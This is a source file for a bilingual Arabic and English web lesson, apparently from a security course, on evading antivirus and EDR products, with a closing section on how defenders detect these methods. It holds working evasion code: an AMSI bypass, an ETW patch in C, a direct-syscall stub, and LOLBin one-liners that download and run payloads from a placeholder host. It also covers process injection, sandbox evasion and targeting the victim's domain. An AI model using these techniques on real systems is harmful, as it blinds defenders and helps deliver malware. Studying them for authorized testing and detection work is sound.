"use client";
import { LessonShell, Section, Callout, Code, Analogy, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="evasion">
      <L
        ar={<>
          <Section title="القط والفار — مين بيلاحق مين؟">
            <Analogy>الـ EDR الحديث مش بيدوّر على الـ "virus" القديم اللي بـ signature. بيدوّر على <b>السلوك</b>: Word بيشغّل PowerShell؟ ذاكرة فيها Cobalt Strike beacon pattern؟ child process لـ msword.exe اسمه cmd.exe؟ كله flags. شغل المهاجم المتقدم: يخلّي السلوك يبان طبيعي. مش يشغّل tool، يخلّي الـ tool يبان زي اللي حواليه.</Analogy>

            <p>- طب يا حضرتك إحنا عندنا EDR بـ مليون دولار، ده بيقفل كل حاجة!</p>

            <p>متوقّع كالعادة يا مستجد. لو AV التقليدي مات، ليه لسه الناس بيعتمدوا على signatures؟ ليه لسه عندنا "تحديث الـ definitions"؟ الـ vendor بيبيع لك راحة بال، مش حماية. الفرق كبير.</p>
            <Callout kind="danger" title="قبل ما تكمّل">هذا الدرس لـ red team عنده تصريح كتابي. الهدف الحقيقي: المدافع يعرف بيدوّر على ايه، وما يثقش ثقة عميا في AV. الـ EDR كله اللي بيقولك "100% detection" بيكدب عليك. مفيش EDR بيقفل كل حاجة.</Callout>
          </Section>
          <Section title="طبقات الكشف اللي لازم تتجاوزها">
            <ol>
              <li><b>Static AV</b> — توقيعات الملف.</li>
              <li><b>AMSI</b> — يفحص النصوص قبل تنفيذها (PowerShell, JS, VBA).</li>
              <li><b>ETW</b> — مصدر تليمتري لـ EDR.</li>
              <li><b>User-mode hooks</b> داخل ntdll.dll.</li>
              <li><b>Kernel callbacks</b> (PsSetCreateProcessNotifyRoutine).</li>
              <li><b>Behavioral / ML</b> في السحابة.</li>
            </ol>
          </Section>
          <Section title="AMSI Bypass — أساسيات">
            <p>AMSI = Antimalware Scan Interface. يتعرّض الـ PowerShell payload له قبل التنفيذ. الفكرة: إفساد العلم (amsiInitFailed) أو تصحيح الذاكرة.</p>
            <Code lang="PowerShell — historical">{`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
  .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`}</Code>
            <p>الأساليب الحديثة:</p>
            <ul>
              <li><b>Hardware Breakpoints</b> على AmsiScanBuffer.</li>
              <li><b>Patch in memory</b> — VirtualProtect → mov eax, 0x80070057 ; ret.</li>
              <li><b>Reflection + obfuscation</b> ديناميكي للسلاسل.</li>
            </ul>
          </Section>
          <Section title="ETW Patching — تعمية المراقبة">
            <p>الـ EDR يقرأ من ETW providers. تعطيل EtwEventWrite داخل العملية يقطع التليمتري عنها فقط (لا عن النظام).</p>
            <Code lang="C — concept">{`DWORD oldProt;
void* p = GetProcAddress(GetModuleHandleA("ntdll"), "EtwEventWrite");
VirtualProtect(p, 1, PAGE_EXECUTE_READWRITE, &oldProt);
*(BYTE*)p = 0xC3;  // ret
VirtualProtect(p, 1, oldProt, &oldProt);`}</Code>
          </Section>
          <Section title="Unhooking — استرجاع ntdll نظيف">
            <p>الـ EDR يضع jmp في بداية دوال ntdll. نعيد قراءة ntdll.dll من القرص و نستبدل قسم .text في الذاكرة.</p>
          </Section>
          <Section title="Direct & Indirect Syscalls">
            <p>بدلاً من استدعاء NtAllocateVirtualMemory من ntdll (المهوكة)، ننفّذ syscall مباشرة.</p>
            <ul>
              <li>SysWhispers3 / Hell's Gate / Halo's Gate / Tartarus Gate.</li>
              <li><b>Indirect syscall</b> أصعب اكتشافاً (يحافظ على شكل call stack).</li>
            </ul>
            <Code lang="ASM">{`Nt$Func PROC
    mov r10, rcx
    mov eax, SSN
    syscall
    ret
Nt$Func ENDP`}</Code>
          </Section>
          <Section title="Process Injection — الكلاسيكيات الحديثة">
            <ul>
              <li><b>Process Hollowing</b> — تشغيل عملية شرعية ثم استبدال محتواها.</li>
              <li><b>Module Stomping</b> — تحميل DLL شرعي ثم الكتابة فوقه.</li>
              <li><b>Early Bird APC</b> — حقن قبل بدء التنفيذ الفعلي.</li>
              <li><b>Thread Pool Injection</b> (PoolParty) — يتجاوز معظم الـ EDRs حالياً.</li>
              <li><b>Indirect Dynamic Call</b> + stack spoofing.</li>
            </ul>
          </Section>
          <Section title="Payload Obfuscation و التشفير">
            <ul>
              <li>Donut — حوّل PE/DLL/.NET إلى shellcode مشفّر.</li>
              <li>Sliver / Havoc — توليد implants مع sleep obfuscation (Ekko, Foliage).</li>
              <li>Nimcrypt2 / PEzor / Freeze.</li>
              <li><b>Sleep masking</b> — تشفير الذاكرة أثناء الـ sleep ليتجنب memory scanners.</li>
              <li><b>Stack Spoofing</b> — تزييف call stack ليبدو كأن النداء جاء من مكان شرعي.</li>
            </ul>
          </Section>
          <Section title="Living-off-the-Land (LOLBins)">
            <p>استخدام أدوات Microsoft الموقّعة لتنفيذ كود — يمر دون توقيع خبيث:</p>
            <Code lang="LOLBAS examples">{`rundll32.exe shell32.dll,Control_RunDLL evil.cpl
regsvr32 /s /u /n /i:http://a/b.sct scrobj.dll
certutil -urlcache -split -f http://a/x.exe x.exe
bitsadmin /transfer j http://a/x.exe %temp%\\x.exe
InstallUtil.exe /logfile= /LogToConsole=false /U evil.exe
wmic process call create "powershell -enc ..."`}</Code>
            <p>قائمة مرجعية: lolbas-project.github.io.</p>
          </Section>
          <Section title="Sandbox & VM Evasion">
            <ul>
              <li>التحقق من عدد المعالجات و الذاكرة (≤2 cores, &lt;4GB RAM = sandbox محتمل).</li>
              <li>قياس وقت Sleep (sandbox غالباً يقفز فوقه).</li>
              <li>وجود VBoxService.exe / vmtoolsd.exe / artifacts.</li>
              <li>تحرّك الفأرة و سجل الـ recent docs.</li>
              <li><b>Domain check</b> — لا تنفّذ إلا داخل دومين الضحية.</li>
            </ul>
          </Section>
          <Section title="الحماية — إزاي الـ Blue Team بيكشف ده كله">
            <ul>
              <li>Sysmon + قواعد SwiftOnSecurity / Olaf Hartong.</li>
              <li>ETW-TI (Threat Intelligence provider) لرصد syscalls مباشرة.</li>
              <li>Memory scanning دوري بـ Moneta / pe-sieve / Hollows Hunter.</li>
              <li>قواعد YARA على الذاكرة لـ CobaltStrike beacons, Sliver, Mythic.</li>
              <li>كشف unbacked memory (RWX, no module) = إنذار.</li>
              <li>منع child processes غير المعتادة من Office عبر ASR rules.</li>
              <li>تطبيق WDAC / AppLocker في وضع enforced.</li>
              <li>Credential Guard, HVCI.</li>
            </ul>
            <Callout kind="good" title="الحقيقة المرّة">أحسن EDR في السوق مش هيلاقط 100%. الكشف الحقيقي بييجي من <b>دمج طبقات</b>: behavior + network + identity + cloud، وفوقهم UEBA. اللي بيعتمد على EDR لوحده، بيعرّض نفسه. اللي بيعتمد على network IDS لوحده، بيعرّض نفسه. الـ defense in depth مش buzzword، ده اللي بيشتغل فعلاً.</Callout>
          </Section>
          <Section title="غلطات الـ junior في الـ red team side">
            <Callout kind="warn" title="بلاش تعمل كده">
              <ul>
                <li>تجرّب payload على VirusTotal. VT بيوزّع الـ samples للـ AV vendors. انت كده حرقت الـ implant بنفسك.</li>
                <li>تستخدم default Cobalt Strike profile. كل blue team في العالم بيـ block JA3 hash بتاعه.</li>
                <li>تنسى تـ obfuscate الـ C2 sleep timing. الـ network detection بتلاقط الـ regular beaconing من بعيد.</li>
                <li>تستخدم AMSI bypass من 2018. الـ string-based detection لاقطه قبل ما الـ payload يشتغل.</li>
              </ul>
            </Callout>
          </Section>
          <Section title="الخلاصة الناشفة">
            <p>الـ evasion مش حركة واحدة. ده تركيب من 10+ تقنية شغّالة في نفس الوقت: AMSI bypass + ETW patch + indirect syscalls + sleep masking + stack spoofing + LOLBAS + domain check.</p>
            <p>اللي بيكسر واحد فيهم بيكسر الكل. ولو واحد منهم سقط، الـ chain كلها سقطت.</p>
            <p>للمدافع: ما تستثمرش في tool واحد. استثمر في visibility. كل ما الـ data أكتر، كل ما الـ adversary بيلاقي صعوبة يخفي. الـ logs اللي ما بتجمعهاش = هدية للـ adversary.</p>
          </Section>
        </>}
        en={<>
          <Section title="The cat-and-mouse game">
            <Analogy>Modern EDRs don't search for the "old virus" anymore — they hunt <b>suspicious behavior</b>: a Word process suddenly spawning PowerShell, or memory that smells like Cobalt Strike. The advanced attacker's job: blend in.</Analogy>
            <Callout kind="danger" title="Important">This lesson is for authorized red team work only. The defensive purpose: know exactly what to hunt for, and never blindly trust an AV.</Callout>
          </Section>
          <Section title="Detection layers to bypass">
            <ol>
              <li><b>Static AV</b> — file signatures.</li>
              <li><b>AMSI</b> — scans script content before execution (PowerShell, JS, VBA).</li>
              <li><b>ETW</b> — telemetry source for the EDR.</li>
              <li><b>User-mode hooks</b> in ntdll.dll.</li>
              <li><b>Kernel callbacks</b> (PsSetCreateProcessNotifyRoutine).</li>
              <li><b>Behavioral / ML</b> in the cloud.</li>
            </ol>
          </Section>
          <Section title="AMSI bypass — basics">
            <p>AMSI = Antimalware Scan Interface. PowerShell payloads pass through it before execution. The idea: corrupt the flag (amsiInitFailed) or patch memory.</p>
            <Code lang="PowerShell — historical">{`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
  .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`}</Code>
            <p>Modern approaches:</p>
            <ul>
              <li><b>Hardware breakpoints</b> on AmsiScanBuffer.</li>
              <li><b>Patch in memory</b> — VirtualProtect → mov eax, 0x80070057 ; ret.</li>
              <li><b>Reflection + dynamic obfuscation</b> of strings.</li>
            </ul>
          </Section>
          <Section title="ETW patching — blinding telemetry">
            <p>EDRs read ETW providers. Disabling EtwEventWrite inside the process cuts telemetry only for that process (not system-wide).</p>
            <Code lang="C — concept">{`DWORD oldProt;
void* p = GetProcAddress(GetModuleHandleA("ntdll"), "EtwEventWrite");
VirtualProtect(p, 1, PAGE_EXECUTE_READWRITE, &oldProt);
*(BYTE*)p = 0xC3;  // ret
VirtualProtect(p, 1, oldProt, &oldProt);`}</Code>
          </Section>
          <Section title="Unhooking — restoring a clean ntdll">
            <p>EDRs install jmps at the top of ntdll functions. We re-read ntdll.dll from disk and replace the .text section in memory.</p>
          </Section>
          <Section title="Direct & Indirect Syscalls">
            <p>Instead of calling NtAllocateVirtualMemory through (hooked) ntdll, we issue the syscall directly.</p>
            <ul>
              <li>SysWhispers3 / Hell's Gate / Halo's Gate / Tartarus Gate.</li>
              <li><b>Indirect syscall</b> is harder to detect (preserves a clean call stack).</li>
            </ul>
            <Code lang="ASM">{`Nt$Func PROC
    mov r10, rcx
    mov eax, SSN
    syscall
    ret
Nt$Func ENDP`}</Code>
          </Section>
          <Section title="Process injection — the modern classics">
            <ul>
              <li><b>Process Hollowing</b> — start a legit process, then swap its content.</li>
              <li><b>Module Stomping</b> — load a legit DLL and overwrite it.</li>
              <li><b>Early Bird APC</b> — inject before the real thread starts.</li>
              <li><b>Thread Pool Injection</b> (PoolParty) — bypasses most EDRs today.</li>
              <li><b>Indirect Dynamic Call</b> + stack spoofing.</li>
            </ul>
          </Section>
          <Section title="Payload obfuscation and packing">
            <ul>
              <li>Donut — convert PE/DLL/.NET to encrypted shellcode.</li>
              <li>Sliver / Havoc — implants with sleep obfuscation (Ekko, Foliage).</li>
              <li>Nimcrypt2 / PEzor / Freeze.</li>
              <li><b>Sleep masking</b> — encrypt memory while sleeping to defeat memory scanners.</li>
              <li><b>Stack spoofing</b> — fake the call stack so the call appears legitimate.</li>
            </ul>
          </Section>
          <Section title="Living-off-the-Land (LOLBins)">
            <p>Use Microsoft-signed tools to execute code — passes signature checks:</p>
            <Code lang="LOLBAS examples">{`rundll32.exe shell32.dll,Control_RunDLL evil.cpl
regsvr32 /s /u /n /i:http://a/b.sct scrobj.dll
certutil -urlcache -split -f http://a/x.exe x.exe
bitsadmin /transfer j http://a/x.exe %temp%\\x.exe
InstallUtil.exe /logfile= /LogToConsole=false /U evil.exe
wmic process call create "powershell -enc ..."`}</Code>
            <p>Reference: lolbas-project.github.io.</p>
          </Section>
          <Section title="Sandbox & VM evasion">
            <ul>
              <li>Check CPU count and RAM (≤2 cores, &lt;4GB RAM hints sandbox).</li>
              <li>Time a Sleep (sandboxes often skip it).</li>
              <li>Look for VBoxService.exe / vmtoolsd.exe / known artifacts.</li>
              <li>Mouse movement and recent-docs registry.</li>
              <li><b>Domain check</b> — only execute inside the victim's domain.</li>
            </ul>
          </Section>
          <Section title="Defense — how Blue Team catches all this">
            <ul>
              <li>Sysmon + SwiftOnSecurity / Olaf Hartong rule sets.</li>
              <li>ETW-TI (Threat Intelligence provider) for direct syscall visibility.</li>
              <li>Periodic memory scans with Moneta / pe-sieve / Hollows Hunter.</li>
              <li>YARA rules over memory for CobaltStrike beacons, Sliver, Mythic.</li>
              <li>Detect unbacked memory (RWX, no module) = alert.</li>
              <li>Block unusual Office child processes via ASR rules.</li>
              <li>Enforce WDAC / AppLocker in enforced mode.</li>
              <li>Credential Guard, HVCI.</li>
            </ul>
            <Callout kind="good" title="A defensive truth">No EDR catches 100%. Real detection comes from <b>combining layers</b>: behavior + network + identity + cloud, with UEBA on top.</Callout>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
